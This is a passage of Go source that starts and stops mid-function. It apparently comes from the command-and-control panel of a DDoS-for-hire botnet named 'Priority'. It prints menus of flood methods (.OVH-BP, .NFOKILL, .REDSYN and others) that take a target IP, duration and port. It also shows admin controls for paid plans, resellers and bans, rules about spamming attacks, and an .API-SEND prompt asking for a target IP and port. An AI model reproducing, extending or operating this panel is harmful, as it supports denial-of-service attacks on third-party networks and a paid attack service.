			this.conn.Write([]byte("\033[00;1;95m              ║ .FN [\033[34mIP\033[00;1;95m]\033[00;1;96m [\033[34mTIME\033[00;1;96m] dport=[\033[34mPORT\033[00;1;96m]                     ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m              ║ .KILLALL [\033[34mIP\033[00;1;95m]\033[00;1;96m [\033[34mTIME\033[00;1;96m] dport=[\033[34mPORT\033[00;1;96m]                ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m              ║ .NFOKILL [\033[34mIP\033[00;1;95m]\033[00;1;96m [\033[34mTIME\033[00;1;96m] dport=[\033[34mPORT\033[00;1;96m]                ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m              ║ .OVH [\033[34mIP\033[00;1;95m]\033[00;1;96m [\033[34mTIME\033[00;1;96m] dport=[\033[34mPORT\033[00;1;96m]                    ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m              ║ .OVH-BP [\033[34mIP\033[00;1;95m]\033[00;1;96m [\033[34mTIME\033[00;1;96m] dport=[\033[34mPORT\033[00;1;96m]                 ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m              ║ .OVH-UDP [\033[34mIP\033[00;1;95m]\033[00;1;96m [\033[34mTIME\033[00;1;96m] dport=[\033[34mPORT\033[00;1;96m]                ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m              ║ .RAID [\033[34mIP\033[00;1;95m]\033[00;1;96m [\033[34mTIME\033[00;1;96m] dport=[\033[34mPORT\033[00;1;96m]                   ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m              ║ .KPAC [\033[34mIP\033[00;1;95m]\033[00;1;96m [\033[34mTIME\033[00;1;96m] dport=[\033[34mPORT\033[00;1;96m]                   ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m              ║ .RANDHEX [\033[34mIP\033[00;1;95m]\033[00;1;96m [\033[34mTIME\033[00;1;96m] dport=[\033[34mPORT\033[00;1;96m]                ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m              ║ .REDSYN [\033[34mIP\033[00;1;95m]\033[00;1;96m [\033[34mTIME\033[00;1;96m] dport=[\033[34mPORT\033[00;1;96m] len=[\033[34m1350\033[00;1;96m]      ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m              ╚═════════════════════════\033[00;1;96m═════════════════════════╝\033[0m\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\033[0m              ONLINE [ \033[00;1;95m%d\033[0m ]\033[0m\r\n", len(sessions))))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "API" || cmd == "api" {
			data, err := ioutil.ReadFile("msg")
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte(fmt.Sprintf("\033[0m𝗟𝗼𝗴𝗴𝗲𝗱 𝗔𝘀: "+username+" | 𝗟𝗶𝘃𝗲: %s\r\n", string(data))))
			this.conn.Write([]byte("\033[00;1;95m                     ╔══════════════════\033[00;1;96m══════════════════╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╔═╗  ╦═╗  ╦  ╔═╗ \033[00;1;96m ╦═╗  ╦  ╔╦╗  ╦ ╦ ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╠═╝  ╠╦╝  ║  ║ ║ \033[00;1;96m ╠╦╝  ║   ║   ╚╦╝ ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╩    ╩╚═  ╩  ╚═╝ \033[00;1;96m ╩╚═  ╩   ╩    ╩  ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                  ╔══╚══════════════════\033[00;1;96m══════════════════╝══╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                  ║ NOT UP CURRENTLY!   \033[00;1;96m                     ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                  ╚═════════════════════\033[00;1;96m═════════════════════╝\033[0m\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\033[0m                  ONLINE [ \033[00;1;95m%d\033[0m ]\033[0m\r\n", len(sessions))))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "FUNC" || cmd == "func" {
			data, err := ioutil.ReadFile("msg")
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte(fmt.Sprintf("\033[0m𝗟𝗼𝗴𝗴𝗲𝗱 𝗔𝘀: "+username+" | 𝗟𝗶𝘃𝗲: %s\r\n", string(data))))
			this.conn.Write([]byte("\033[00;1;95m                     ╔══════════════════\033[00;1;96m══════════════════╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╔═╗  ╦═╗  ╦  ╔═╗ \033[00;1;96m ╦═╗  ╦  ╔╦╗  ╦ ╦ ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╠═╝  ╠╦╝  ║  ║ ║ \033[00;1;96m ╠╦╝  ║   ║   ╚╦╝ ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╩    ╩╚═  ╩  ╚═╝ \033[00;1;96m ╩╚═  ╩   ╩    ╩  ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ╔╚══════════════════\033[00;1;96m══════════════════╝╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34mASCII\033[00;1;95m - MAKE YOUR \033[00;1;96mOWN BANNER         ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34mCHAT\033[00;1;95m - JOIN THE NE\033[00;1;96mT CHAT             ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34mUSERS\033[00;1;95m - SHOWS ONLI\033[00;1;96mNE USERS           ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34mMSG\033[00;1;95m - MESSAGE ANOT\033[00;1;96mHER USER           ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34mINBOX\033[00;1;95m - CHECK YOUR\033[00;1;96m INBOX             ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34mREPORT\033[00;1;95m - REPORT A \033[00;1;96mUSER               ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ╚═══════════════════\033[00;1;96m═══════════════════╝\033[0m\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\033[0m                    ONLINE [ \033[00;1;95m%d\033[0m ]\033[0m\r\n", len(sessions))))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "ACCOUNT" || cmd == "account" {
			data, err := ioutil.ReadFile("msg")
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte(fmt.Sprintf("\033[0m𝗟𝗼𝗴𝗴𝗲𝗱 𝗔𝘀: "+username+" | 𝗟𝗶𝘃𝗲: %s\r\n", string(data))))
			this.conn.Write([]byte("\033[00;1;95m                     ╔══════════════════\033[00;1;96m══════════════════╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╔═╗  ╦═╗  ╦  ╔═╗ \033[00;1;96m ╦═╗  ╦  ╔╦╗  ╦ ╦ ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╠═╝  ╠╦╝  ║  ║ ║ \033[00;1;96m ╠╦╝  ║   ║   ╚╦╝ ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╩    ╩╚═  ╩  ╚═╝ \033[00;1;96m ╩╚═  ╩   ╩    ╩  ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ╔╚══════════════════\033[00;1;96m══════════════════╝╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34mPASSWD\033[00;1;95m - CHANGE YO\033[00;1;96mUR PASSWORD        ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34mMFAON\033[00;1;95m - ADD 2 FACT\033[00;1;96mOR AUTH TO UR ACC  ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34mMFAOFF\033[00;1;95m - TURN OFF \033[00;1;96m2FA TO UR ACC      ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34mMYPLAN\033[00;1;95m - SHOWS YOU\033[00;1;96mR ACCOUNT DETAILS  ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34mLOGOUT\033[00;1;95m - LOGOUT OF\033[00;1;96m YOUR ACCOUNT      ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ╚═══════════════════\033[00;1;96m═══════════════════╝\033[0m\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\033[0m                    ONLINE [ \033[00;1;95m%d\033[0m ]\033[0m\r\n", len(sessions))))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "TOOLS" || cmd == "tools" {
			data, err := ioutil.ReadFile("msg")
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte(fmt.Sprintf("\033[0m𝗟𝗼𝗴𝗴𝗲𝗱 𝗔𝘀: "+username+" | 𝗟𝗶𝘃𝗲: %s\r\n", string(data))))
			this.conn.Write([]byte("\033[00;1;95m                     ╔══════════════════\033[00;1;96m══════════════════╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╔═╗  ╦═╗  ╦  ╔═╗ \033[00;1;96m ╦═╗  ╦  ╔╦╗  ╦ ╦ ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╠═╝  ╠╦╝  ║  ║ ║ \033[00;1;96m ╠╦╝  ║   ║   ╚╦╝ ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╩    ╩╚═  ╩  ╚═╝ \033[00;1;96m ╩╚═  ╩   ╩    ╩  ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ╔╚══════════════════\033[00;1;96m══════════════════╝╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34m.iplookup\033[00;1;95m - Lookup\033[00;1;96m An IPv4           ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34m.ping\033[00;1;95m - Ping An IP\033[00;1;96mv4                 ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34m.resolve\033[00;1;95m - Resolve\033[00;1;96m A Website / URL   ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34m.portscan\033[00;1;95m - Port S\033[00;1;96mcan An IPv4        ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34m.whois\033[00;1;95m - WHOIS Sea\033[00;1;96mrch Up             ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34m.asnlookup\033[00;1;95m - See R\033[00;1;96manges Of An ASN    ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34m.zonetransfer\033[00;1;95m - Sh\033[00;1;96mows ZT             ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34m.subnetcalc\033[00;1;95m - Calc\033[00;1;96mulate A Subnet     ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34m.reversedns\033[00;1;95m - Find\033[00;1;96m DNS Of A IPv4     ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34m.traceroute\033[00;1;95m - Trac\033[00;1;96meroute An IPv4     ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ╚═══════════════════\033[00;1;96m═══════════════════╝\033[0m\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\033[0m                    ONLINE [ \033[00;1;95m%d\033[0m ]\033[0m\r\n", len(sessions))))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "RULES" || cmd == "rules" {
			data, err := ioutil.ReadFile("msg")
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte(fmt.Sprintf("\033[0m𝗟𝗼𝗴𝗴𝗲𝗱 𝗔𝘀: "+username+" | 𝗟𝗶𝘃𝗲: %s\r\n", string(data))))
			this.conn.Write([]byte("\033[00;1;95m                     ╔══════════════════\033[00;1;96m══════════════════╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╔═╗  ╦═╗  ╦  ╔═╗ \033[00;1;96m ╦═╗  ╦  ╔╦╗  ╦ ╦ ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╠═╝  ╠╦╝  ║  ║ ║ \033[00;1;96m ╠╦╝  ║   ║   ╚╦╝ ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╩    ╩╚═  ╩  ╚═╝ \033[00;1;96m ╩╚═  ╩   ╩    ╩  ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m               ╔═════╚══════════════════\033[00;1;96m══════════════════╝═════╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m               ║ \033[31mNO\033[00;1;95m SHARING THE NET IP /\033[00;1;96m DOMAIN                 ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m               ║ \033[31mNO\033[00;1;95m SHARING YOUR NET LOG\033[00;1;96mIN INFO                 ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m               ║ \033[31mNO\033[00;1;95m ATTACKING ANY DSTATS\033[00;1;96m THAT ARE PUBLIC        ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m               ║ \033[31mNO\033[00;1;95m SPAMMING ATTACKS    \033[00;1;96m                        ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m               ║ \033[31mNO\033[00;1;95m ADMIN WILL ASK FOR Y\033[00;1;96mOUR PASSWORD            ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m               ║ RESELLERS \033[31mWILL NOT\033[00;1;95m MAKE\033[00;1;96m FREE ACCOUNTS          ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m               ║ RESELLERS \033[31mWILL NOT\033[00;1;95m CHAN\033[00;1;96mGE THE NET PRICES       ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m               ║ YOUR COOLDOWN \033[31mDOSE NOT\033[00;1;95m \033[00;1;96mSTOP SPAMMING           ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m               ║ TALKING SHIT TO ANY ADM\033[00;1;96mIN IS \033[31mBANNABLE\033[00;1;96m          ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m               ╚════════════════════════\033[00;1;96m════════════════════════╝\033[0m\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\033[0m               ONLINE [ \033[00;1;95m%d\033[0m ]\033[0m\r\n", len(sessions))))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "BANNERS" || cmd == "banners" {
			data, err := ioutil.ReadFile("msg")
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte(fmt.Sprintf("\033[0m𝗟𝗼𝗴𝗴𝗲𝗱 𝗔𝘀: "+username+" | 𝗟𝗶𝘃𝗲: %s\r\n", string(data))))
			this.conn.Write([]byte("\033[00;1;95m                     ╔══════════════════\033[00;1;96m══════════════════╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╔═╗  ╦═╗  ╦  ╔═╗ \033[00;1;96m ╦═╗  ╦  ╔╦╗  ╦ ╦ ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╠═╝  ╠╦╝  ║  ║ ║ \033[00;1;96m ╠╦╝  ║   ║   ╚╦╝ ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╩    ╩╚═  ╩  ╚═╝ \033[00;1;96m ╩╚═  ╩   ╩    ╩  ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ╔╚══════════════════\033[00;1;96m══════════════════╝╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34mDDG\033[00;1;95m - SHOWS DUCK D\033[00;1;96mUCK GO BANNER      ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34mCUM\033[00;1;95m - B=====D     \033[00;1;96m                   ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34mSNIPS\033[00;1;95m - @snips.arm\033[00;1;96m's Banner          ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34mROOTED\033[00;1;95m - @rooted.m\033[00;1;96mips's Banner       ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34mDAD\033[00;1;95m - OH YES DADDY\033[00;1;96m                   ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34mPUSSY\033[00;1;95m - SHOWS SOME\033[00;1;96m PUSSY CAT         ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34m<3\033[00;1;95m - LITERALLY <3 \033[00;1;96m                   ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ╚═══════════════════\033[00;1;96m═══════════════════╝\033[0m\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\033[0m                    ONLINE [ \033[00;1;95m%d\033[0m ]\033[0m\r\n", len(sessions))))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "EXTHELP" || cmd == "exthelp" {
			data, err := ioutil.ReadFile("msg")
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte(fmt.Sprintf("\033[0m𝗟𝗼𝗴𝗴𝗲𝗱 𝗔𝘀: "+username+" | 𝗟𝗶𝘃𝗲: %s\r\n", string(data))))
			this.conn.Write([]byte("\033[00;1;95m                     ╔══════════════════\033[00;1;96m══════════════════╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╔═╗  ╦═╗  ╦  ╔═╗ \033[00;1;96m ╦═╗  ╦  ╔╦╗  ╦ ╦ ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╠═╝  ╠╦╝  ║  ║ ║ \033[00;1;96m ╠╦╝  ║   ║   ╚╦╝ ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╩    ╩╚═  ╩  ╚═╝ \033[00;1;96m ╩╚═  ╩   ╩    ╩  ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                  ╔══╚══════════════════\033[00;1;96m══════════════════╝══╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                  ║ Need Extra Help? Com\033[00;1;96me DM Us Via Net CNC! ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                  ╚═════════════════════\033[00;1;96m═════════════════════╝\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                  ╔═════════════════════\033[00;1;96m═════════════════════╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                  ║   To DM An Admin Typ\033[00;1;96me 'msg (Username)'   ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                  ║═════════════════════\033[00;1;96m═════════════════════║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                  ║ When Sent Make Sure \033[00;1;96mTo Actively Check Ur ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                  ║Inbox For A Message B\033[00;1;96mack By Typing 'inbox'║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                  ║═════════════════════\033[00;1;96m═════════════════════║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                  ║ (\033[34mrkgi\033[00;1;95m) rooted.mips  \033[00;1;96m   (\033[34mtrap\033[00;1;96m) trapdowned ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                  ║ (\033[34mblazing\033[00;1;95m) blazing_ru\033[00;1;96mns (\033[34mskidrip\033[00;1;96m) skidrip ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                  ╚═════════════════════\033[00;1;96m═════════════════════╝\033[0m\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\033[0m                  ONLINE [ \033[00;1;95m%d\033[0m ]\033[0m\r\n", len(sessions))))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if userInfo.admin == 1 && cmd == "ADMIN" || userInfo.admin == 1 && cmd == "admin" {
			data, err := ioutil.ReadFile("msg")
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte(fmt.Sprintf("\033[0m𝗟𝗼𝗴𝗴𝗲𝗱 𝗔𝘀: "+username+" | 𝗟𝗶𝘃𝗲: %s\r\n", string(data))))
			this.conn.Write([]byte("\033[00;1;95m                     ╔══════════════════\033[00;1;96m══════════════════╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╔═╗  ╦═╗  ╦  ╔═╗ \033[00;1;96m ╦═╗  ╦  ╔╦╗  ╦ ╦ ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╠═╝  ╠╦╝  ║  ║ ║ \033[00;1;96m ╠╦╝  ║   ║   ╚╦╝ ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ║ ╩    ╩╚═  ╩  ╚═╝ \033[00;1;96m ╩╚═  ╩   ╩    ╩  ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ╔╚══════════════════\033[00;1;96m══════════════════╝╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34m.ADDUSR\033[00;1;95m - ADD A US\033[00;1;96mER TO THE NET      ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34mEDITEXPIRY\033[00;1;95m - EDIT \033[00;1;96mA USERS EXPIRY     ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34mBANUSER\033[00;1;95m - TEMPBAN \033[00;1;96m/ BAN A USER       ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34mUNBANUSER\033[00;1;95m - UNBAN \033[00;1;96mA USER!            ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34mLISTUSERS\033[00;1;95m - LISTS \033[00;1;96mALL USERS          ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34mCHMSG\033[00;1;95m - CHANGE CNC\033[00;1;96m MESSAGE           ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34mUSERS\033[00;1;95m - SHOWS ONLI\033[00;1;96mNE USERS           ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34mALLPLANS\033[00;1;95m - ADD DAY\033[00;1;96m TO EVERY PLAN     ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34mWHO\033[00;1;95m - SHOWS ADMINS\033[00;1;96m ONLINE            ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34mBANS\033[00;1;95m - SHOWS ALL T\033[00;1;96mHE BANNED USERS    ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ║ \033[34mSESSIONS\033[00;1;95m - SHOWS O\033[00;1;96mNLINE WITH IP      ║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                    ╚═══════════════════\033[00;1;96m═══════════════════╝\033[0m\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\033[0m                    ONLINE [ \033[00;1;95m%d\033[0m ]\033[0m\r\n", len(sessions))))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == ".API-SEND" || cmd == ".api-send" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[00;1;95m                      ▄▄▄\033[00;1;96m·\033[00;1;95m▄▄▄  \033[00;1;96m▪\033[00;1;95m        ▄▄▄  \033[00;1;96m▪\033[00;1;95m  ▄▄▄▄▄ ▄\033[00;1;96m·\033[00;1;95m ▄▌\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ▐█ ▄█▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m ▪\033[00;1;95m     ▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m •\033[00;1;95m██  ▐█\033[00;1;96m▪\033[00;1;95m██▌\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                      ██▀\033[00;1;96m·\033[00;1;95m▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▄█▀▄ ▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▐█\033[00;1;96m.▪\033[00;1;95m▐█▌▐█\033[00;1;96m▪\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ▐█\033[00;1;96m▪·•\033[00;1;95m▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌▐█▌\033[00;1;96m.\033[00;1;95m▐▌▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌ ▐█▌\033[00;1;96m·\033[00;1;95m ▐█▀\033[00;1;96m·.\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     .\033[00;1;95m▀   \033[00;1;96m.\033[00;1;95m▀  ▀▀▀▀ ▀█▄▀\033[00;1;96m▪.\033[00;1;95m▀  ▀▀▀▀ ▀▀▀   ▀ \033[00;1;96m•\033[0m\r\n"))
			this.conn.Write([]byte("\033[31m                                       💔\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                   ╔════════════════════\033[00;1;96m════════════════════╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                   ║- - - - - Welcome To\033[00;1;96m \033[34mPriority\033[00;1;96m! - - - - -║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                   ║- - -Please Enter An\033[00;1;96m \033[34mIP\033[00;1;96m To Continue- - -║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                   ╚════════════════════\033[00;1;96m════════════════════╝\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mIP\033[0m: "))
			locipaddress, err := this.ReadLine(false)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[00;1;95m                      ▄▄▄\033[00;1;96m·\033[00;1;95m▄▄▄  \033[00;1;96m▪\033[00;1;95m        ▄▄▄  \033[00;1;96m▪\033[00;1;95m  ▄▄▄▄▄ ▄\033[00;1;96m·\033[00;1;95m ▄▌\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ▐█ ▄█▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m ▪\033[00;1;95m     ▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m •\033[00;1;95m██  ▐█\033[00;1;96m▪\033[00;1;95m██▌\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                      ██▀\033[00;1;96m·\033[00;1;95m▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▄█▀▄ ▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▐█\033[00;1;96m.▪\033[00;1;95m▐█▌▐█\033[00;1;96m▪\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     ▐█\033[00;1;96m▪·•\033[00;1;95m▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌▐█▌\033[00;1;96m.\033[00;1;95m▐▌▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌ ▐█▌\033[00;1;96m·\033[00;1;95m ▐█▀\033[00;1;96m·.\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                     .\033[00;1;95m▀   \033[00;1;96m.\033[00;1;95m▀  ▀▀▀▀ ▀█▄▀\033[00;1;96m▪.\033[00;1;95m▀  ▀▀▀▀ ▀▀▀   ▀ \033[00;1;96m•\033[0m\r\n"))
			this.conn.Write([]byte("\033[31m                                       💔\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                   ╔════════════════════\033[00;1;96m════════════════════╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                   ║- - - - - Welcome To\033[00;1;96m \033[34mPriority\033[00;1;96m! - - - - -║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                   ║- - Please Enter A \033[34mPORT\033[00;1;96m To Continue! - -║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                   ╚════════════════════\033[00;1;96m════════════════════╝\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mPORT\033[0m: "))
			port, err := this.ReadLine(false)
			this.conn.Write([]byte("\033[2J\033[1H"))
